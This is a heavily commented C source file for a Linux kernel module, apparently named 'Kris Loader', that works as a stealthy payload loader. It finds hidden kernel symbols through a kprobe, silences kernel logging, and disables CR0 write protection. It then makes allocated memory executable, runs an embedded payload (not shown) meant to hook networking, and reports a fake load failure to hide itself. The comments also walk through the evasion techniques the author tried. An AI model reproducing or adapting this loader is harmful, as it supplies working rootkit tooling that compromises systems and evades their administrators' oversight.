#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <net/net_namespace.h>

#include "payload.inc"

// Uncomment the following line to enable debug output
// #define DEBUG_LOADER

// Uncomment the following line to disable console suppression
// #define NO_SUPPRESS_KMSG

#ifdef DEBUG_LOADER
#define Dprintk(fmt, ...) printk(KERN_DEBUG "Kris Loader: " fmt, ##__VA_ARGS__)
#else
#define Dprintk(fmt, ...) no_printk(KERN_DEBUG fmt, ##__VA_ARGS__)
#endif

#ifdef NO_SUPPRESS_KMSG
#define suppress_kmsg()                                                        \
	do {                                                                       \
	} while (0)
#define unsuppress_kmsg()                                                      \
	do {                                                                       \
	} while (0)
#else
// Here we define two functions that will be used to suppress and unsuppress the kernel console.
// The way this works is by simply setting a variable in the kernel called "suppress_printk" to 1.
// This variable is checked by the kernel before printing any messages to the console, and is used to
// prevent log flooding during kernel panics. Because of this, it is not exported by the kernel, so we
// have to use our lookup_name() function to get its address.
// You will notice that we use the smp_mb() function before and after setting the variable.
// These are memory barriers that ensure that the CPU and compiler do not reorder the instructions.
// This is important because the kernel will check the value of the variable before printing a message,
// and if the compiler or CPU reorders the instructions, the kernel will not see the updated value of the variable.
// Finding this method of suppressing the kernel console was a huge pain. There is no documentation on it anywhere,
// and I only found it by looking at the source code of the kernel.
// Thanks bootlin and livegrep!
// Methods I tried that didn't work:
// - Overwriting the printk function pointer in the kernel symbol table.
// - Overwriting the console_loglevel
// - Using the klogctl system call to set the console log level
// - Setting the console log level in /proc/sys/kernel/printk
// - Pausing output using a lock, then trashing the ring buffer with ZWSP characters
// - Using the klogctl system call to clear the ring buffer
// - Using console_suspend() and console_resume() to pause output (I seriously don't understand why this didn't work)
// - Disabling read access to /dev/kmsg
// - Disabling write access to /dev/kmsg
// - Disabling read and write access to /dev/kmsg
// - Various methods of instead trying to get the kernel to not notice the CPA violation, or the fact that the CR0 WP bit went missing
// - And more that I can't even remember because it was in the middle of the night and I was tired.

#define suppress_kmsg()                                                        \
	do {                                                                       \
		smp_mb();                                                              \
		*suppress_printk_ptr = 1;                                              \
		smp_mb();                                                              \
	} while (0)

#define unsuppress_kmsg()                                                      \
	do {                                                                       \
		smp_mb();                                                              \
		*suppress_printk_ptr = 0;                                              \
		smp_mb();                                                              \
	} while (0)
#endif

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Here we use a modern method of getting the addresses of non-exported kernel symbols.
// Further reading: https://github.com/xcellerator/linux_kernel_hacking/issues/3
// kprobe is a mechanism in Linux kernel for adding probes i.e, it allows to break into any kernel routine and
// collect debugging and performance information non-disruptively.
// Here we're setting kprobe to break into a kernel function named "kallsyms_lookup_name".
static struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};

// kallsyms_lookup_name is a function that takes a string representing a symbol name and returns the address of that symbol.
// This function is not directly accessible (non-exported) so we use kprobe to get its address indirectly.
unsigned long lookup_name(const char *name) {
	// Here we're defining a type: kallsyms_lookup_name_t. It's a function pointer type which receives a string
	// as input and returns an unsigned long. This is the type of the function "kallsyms_lookup_name".
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

	// Declare a function pointer of the type we just defined.
	kallsyms_lookup_name_t kallsyms_lookup_name;

	// Now register the kprobe 'kp'.
	register_kprobe(&kp);

	// Probe is successful, we can now get the address of the function "kallsyms_lookup_name".
	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

	// Unregister the kprobe as we have got the function address we wanted.
	unregister_kprobe(&kp);

	// Now we call the function "kallsyms_lookup_name" with the provided name.
	// This will return the address of the given symbol if it exists, otherwise it will return 0.
	// Basically, we can now use lookup_name() to get the address of any kernel symbol!
	return kallsyms_lookup_name(name);
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// Here we define two functions that will be used to modify the write protection bit of the CR0 register.
// It is important to note that without using the suppress_kmsg() and unsuppress_kmsg() functions,
// the kernel will complain about the write protection bit being modified.
// This is because of a concept called CR0 pinning.
// Also important to note is that leaving the write protection bit disabled for too long can cause
// serious issues with the system, as programs can modify read-only pages, corrupting the kernel!

// The variable __force_order is used to ensure instruction order and prevent the
// CPU or compiler from executing instructions out of order for optimization.
extern void *__force_order;

// The function zero_wp is used to disable the Write Protection (WP) bit of the CR0 register.
// The CR0 register is a control register that is used to control how the CPU operates.
void zero_wp(void) {
	// Local variable to hold the value of the CR0 register.
	unsigned long cr0;

	// Inline assembly to store the current value of the CR0 register into cr0.
	// The "memory" clobber tells the compiler to assume that any memory pointed to
	// by the program's input variables could be changed.
	asm volatile("cli\n\t"
	             "mov %%cr0, %0"
	             : "=r"(cr0), "+m"(__force_order)
	             :
	             : "memory");

	// Modify the local copy of the CR0 register's value to disable the WP bit.
	cr0 &= ~0x10000UL;

	// Use inline assembly to write the modified value back to the actual CR0 register.
	asm volatile("mov %0, %%cr0" : : "r"(cr0), "m"(__force_order));
}

// The function one_wp is used to enable the WP bit of the CR0 register.
void one_wp(void) {
	// Local variable to hold the value of the CR0 register.
	unsigned long cr0;

	// Inline assembly to store the current value of the CR0 register into cr0.
	asm volatile("mov %%cr0, %0" : "=r"(cr0), "+m"(__force_order) : : "memory");

	// Modify the local copy of the CR0 register's value to enable the WP bit.
	cr0 |= 0x10000UL;

	// Use inline assembly to write the modified value back to the actual CR0 register and afterwards
	// resume the execution of interrupts (sti instruction)
	asm volatile("mov %0, %%cr0\n\t"
	             "sti"
	             :
	             : "r"(cr0), "m"(__force_order));
}

// Let me give you a breakdown of the assembly instructions used in the zero_wp() and one_wp() functions.
// (Note that this is only as far as I understand it, I'm not an expert on assembly.
// The source of the assembly instructions is the Linux kernel source code.)
// First, "cli" stands for "Clear Interrupts". This prevents interrupts from occurring while modifying
// the CR0 register. It's, essentially, a way to make the operation atomic, preventing other
// processes from intervening while we modify the CR0 register.

// "mov %%cr0, %0" is the assembly instruction that moves the contents of the CR0 control
// register into the local cr0 variable. The double % %% is a way to escape the \% character in
// GCC inline assembly. The %0 denotes the first output operand which in our case is the local
// variable cr0.

// "+m"(__force_order) is an input-output operand which tells the compiler that the variable
// __force_order can be read from and written to. The "+" symbol indicates that the variable is
// both an input and an output.

// "=r"(cr0) is an output operand which tells the compiler that it should be writing the result
// into the CPU register that the local C variable cr0 maps to.

// "memory" in the clobber list tells the compiler that the function may change memory
// arbitrarily, so it should not make assumptions about what data will remain the same.

// "mov %0, %%cr0" is the assembly instruction that moves the contents of the local cr0 variable
// back into the CR0 control register.

// "sti" (Set Interrupts) used in the one_wp() function, allows the CPU to process other
// interrupts after the modification of the CR0 register is done, thereby resuming normal
// operation. This ensures that we don't leave the system in a state where it cannot respond
// to external events.

// And finally, the &= ~0x10000UL and |= 0x10000UL operations are bit manipulation to clear
// and set the WP (Write-Protection) bit respectively. Since WP is bit 16 in the CR0 register,
// 0x10000UL is the mask used to clear or set this bit.

////////////////////////////////////////////////////////////////////////////////////////////////////
// The `init_module` function is the entry point of the kernel module.
// It will be executed when the kernel module is loaded using the `insmod` command.
int init_module(void) {
	// This is will be a pointer to the place in memory where the payload will be copied.
	void *mem = NULL;

	// These are function pointers to the module_alloc() and set_memory_x() functions.
	// We need these so we can store the return values of lookup_name() in them.
	void *(*module_alloc)(long size) = NULL;
	int (*set_memory_x)(unsigned long, int) = NULL;

	// Here we check if we need to suppress the kernel console.
	// if we do, we get the address of the suppress_printk variable.
#ifndef NO_SUPPRESS_KMSG
	int *suppress_printk_ptr = NULL;
	suppress_printk_ptr = (int *)lookup_name("suppress_printk");
	if (!suppress_printk_ptr) {
		Dprintk("suppress_printk not found\n");
		goto Error;
	}
#endif

	// Here we use the lookup_name() function to get the address of the module_alloc() function.
	module_alloc = (void *)lookup_name("module_alloc");
	if (!module_alloc) {
		Dprintk("module_alloc() not found\n");
		goto Error;
	}

	// Here we use module_alloc() to allocate memory for the payload.
	// The payload is rounded up to the nearest page size.
	// This is because the set_memory_x() function requires the size to be a multiple of the page size.
	// The payload is then copied into the allocated memory.
	mem = module_alloc(round_up(payload_len, PAGE_SIZE));
	if (!mem) {
		Dprintk("module_alloc(payload_len) failed\n");
		goto Error;
	}

	Dprintk("About to suppress console, see you on the other side\n");

	// Here we suppress the kernel console.
	suppress_kmsg();

#ifdef NO_SUPPRESS_KMSG
	Dprintk("console would be suppressed here, but since NO_SUPPRESS_KMSG is "
	        "defined, it isn't\n");
#else
	Dprintk("console suppressed (you shouldn't see this)\n");
#endif

	Dprintk("Before disabiling WP\n");

	Dprintk("The value of cr0 before modification :%lx\n", read_cr0());

	// Here we disable the write protection bit of the CR0 register.
	zero_wp();

	Dprintk("The value of cr0 after open :%lx\n", read_cr0());

	// Now that the write protection bit is disabled, we can write to read-only pages.
	// This is necessary as module_alloc() allocates non-executable memory.
	// We need to set the memory as executable so once we copy the payload into it, we can execute it.
	// Here we use the lookup_name() function to get the address of the set_memory_x() function.
	set_memory_x = (void *)lookup_name("set_memory_x");
	if (set_memory_x) {
		// Here we round up the payload size to the nearest page size and divide it by the page size.
		// This gives us the number of pages we need to set as executable.
		Dprintk("set_memory_x found\n");
		Dprintk("About to set memory executable\n");
		int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
		set_memory_x((unsigned long)mem, numpages);
	}
	Dprintk("memory set executable!\n");

	// Now that the memory is executable, we copy the payload into it.
	memcpy(mem, payload, payload_len);
	Dprintk("memcopy attempted!\n");
	// Here we enable the write protection bit of the CR0 register.
	one_wp();
	Dprintk("The value of cr0 after close :%lx\n", read_cr0());
	// Here we unsuppress the kernel console.
	unsuppress_kmsg();

#ifdef NO_SUPPRESS_KMSG
	Dprintk("console would be unsuppressed here\n");
#else
	Dprintk("console no longer suppressed\n");
#endif
	// The above proess could maybe have been done instead by first copying the payload into the allocated memory,
	// then setting the memory as unwritable, then setting the memory as executable.
	// This would have saved us from having to disable and re-enable the write protection bit of the CR0 register,
	// but I don't really know if it would have worked. I'll leave it as an exercise for the reader to try it out!

	Dprintk("About to execute payload\n");

	// Here we execute the payload.
	// We call the entry point of the payload and pass it the address of the lookup_name() function
	// and the address of the init_net variable.
	// The init_net variable is a global variable that contains the address of the init_net struct, which contains
	// information about the network namespace that we need for the nfs hook. I don't really know why we need to pass
	// it in, since we could just use lookup_name() to get the address of the init_net variable, but when I wrote this
	// originally, I wasn't passing in the lookup_name() function, so I guess I just left it in.
	// Speaking of the lookup_name() function, we need to pass it in because the payload needs to be able to get the
	// addresses of a bunch of kernel symbols, and the only way to do that is to use lookup_name().
	int retval = ((long (*)(void *, void *))mem)(lookup_name, &init_net);
	if (retval == 0) {
		Dprintk("payload executed succesfully!\n");
		Dprintk("Telling insmod that we 'failed' (returning -ENOTTY)\n");
		// Here we return -ENOTTY to the insmod command. This tells insmod that the module failed to load.
		// This is because we don't want the module to be loaded into the kernel, we just want to execute the payload.
		// The error code will be something like "incorrect ioctl for device" or something like that.
		return -ENOTTY;
	} else {
		Dprintk("payload was injected, but failed to initialise!\n");
		Dprintk("Payload says: %d\n", retval);
	}

Error:
	// If we get here, it means something went wrong.
	Dprintk("Error encountered, cleaning up\n");
	if (mem) {
		Dprintk("mem was not NULL, attempting to free payload\n");
		// Here we free the memory allocated for the payload.
		// This is because we don't want to leave the memory allocated, as it could cause issues
		// with the system if the payload is in a bad state.
		vfree(mem);
		Dprintk("vfree(mem) attempted!\n");
	} else {
		Dprintk("mem was NULL!\n");
		Dprintk("This is probably because module_alloc() failed\n");
	}
	Dprintk("We failed for real, returning -ESRCH\n");
	// Here we return -ESRCH to the insmod command. This tells insmod that the module failed to load.
	// The error code will be something like "no such process" or something like that.
	return -ESRCH;
}

MODULE_LICENSE("GPL");
